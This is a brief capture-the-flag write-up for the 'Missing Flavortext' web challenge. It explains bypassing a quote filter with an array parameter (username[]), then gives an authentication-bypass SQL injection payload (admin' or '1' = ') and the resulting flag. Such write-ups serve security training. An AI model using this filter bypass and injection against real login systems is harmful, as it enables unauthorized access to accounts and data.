**web/Missing Flavortext**  
We have https://missing-flavortext.dicec.tf and source code index.js  
Review source, in line 34, it have filter ', let bypass it by using multiple input
```
username[]
```
It's a simple SQL Injection
```
admin' or '1' = '
```
We got the flag
```
dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}
```